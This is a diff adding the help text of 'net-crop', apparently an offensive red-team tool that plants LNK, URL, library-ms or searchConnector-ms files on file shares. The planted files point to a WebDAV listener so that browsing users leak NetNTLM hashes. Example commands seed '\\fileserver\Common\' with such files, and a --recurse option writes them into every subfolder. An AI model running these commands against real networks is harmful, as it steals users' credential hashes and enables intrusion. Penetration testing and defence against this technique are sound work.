@@ -1,0 +1,22 @@
+ABOUT
+    Creates LNK, URL, library-ms, or searchConnector-ms files that point to a WebDAV
+    server. When a user browses a folder containing the file, Explorer may authenticate
+    to the WebDAV server and leak NetNTLM hashes to Farmer.
+
+USAGE:
+    net-crop --- <output folder> <output filename> <WebDAV server> <LNK value> [options]
+    net-crop --- <output folder> <output filename> <WebDAV server> [options]
+
+ARGUMENTS:
+    output folder    UNC or local path where the file will be written
+    output filename  Target filename (.lnk, .url, .library-ms, or .searchConnector-ms)
+    WebDAV server    WebDAV path clients should connect to (e.g. \\workstation@8888\harvest)
+    LNK value        Required for .lnk files. Icon or target path stored in the shortcut
+
+OPTIONS:
+    --recurse    Write the file to every subfolder under the output folder
+    --clean      Remove matching files from every subfolder under the output folder
+
+EXAMPLES:
+    net-crop --- \\fileserver\Common\ crop.lnk \\workstation@8888\harvest \\workstation@8888\harvest
+    net-crop --- \\fileserver\Common\ crop.url \\workstation@8888\harvest
